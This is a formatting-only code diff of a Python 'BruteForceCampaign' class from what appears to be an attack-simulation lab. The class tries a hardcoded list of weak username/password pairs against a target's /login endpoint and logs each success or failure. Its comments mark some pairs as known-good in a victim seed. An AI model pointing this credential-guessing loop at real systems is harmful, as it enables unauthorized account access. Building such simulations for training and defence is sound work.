@@ -33,25 +33,25 @@ class BruteForceCampaign(BaseCampaign):
     # credentials (admin/password123, victim/letmein, test/test) plus
     # plausible decoys.
     WORDLIST = [
-        ("admin",  "admin"),
-        ("admin",  "password"),
-        ("admin",  "password123"),    # known-good in victim seed
-        ("root",   "root"),
+        ("admin", "admin"),
+        ("admin", "password"),
+        ("admin", "password123"),  # known-good in victim seed
+        ("root", "root"),
         ("victim", "victim"),
-        ("victim", "letmein"),        # known-good
-        ("test",   "test"),           # known-good
-        ("guest",  "guest"),
-        ("user",   "12345"),
-        ("admin",  "qwerty"),
+        ("victim", "letmein"),  # known-good
+        ("test", "test"),  # known-good
+        ("guest", "guest"),
+        ("user", "12345"),
+        ("admin", "qwerty"),
     ]
     RATE_LIMIT_SECONDS = 1.0
 
     def run(self) -> dict:
         import requests
 
-        self.log_step("init",
-                      f"Brute-forcing /login on {self.target} "
-                      f"({len(self.WORDLIST)} candidates)")
+        self.log_step(
+            "init", f"Brute-forcing /login on {self.target} " f"({len(self.WORDLIST)} candidates)"
+        )
 
         successes: list[dict] = []
         failures = 0
@@ -72,13 +72,13 @@ class BruteForceCampaign(BaseCampaign):
                 continue
 
             if ok:
-                successes.append({"username": username, "password": password,
-                                  "status": resp.status_code})
+                successes.append(
+                    {"username": username, "password": password, "status": resp.status_code}
+                )
                 self.log_step("attempt", f"{username}/{password}: SUCCESS", "success")
             else:
                 failures += 1
-                self.log_step("attempt", f"{username}/{password}: failed",
-                              "warning")
+                self.log_step("attempt", f"{username}/{password}: failed", "warning")
             time.sleep(self.RATE_LIMIT_SECONDS)
 
         results = {
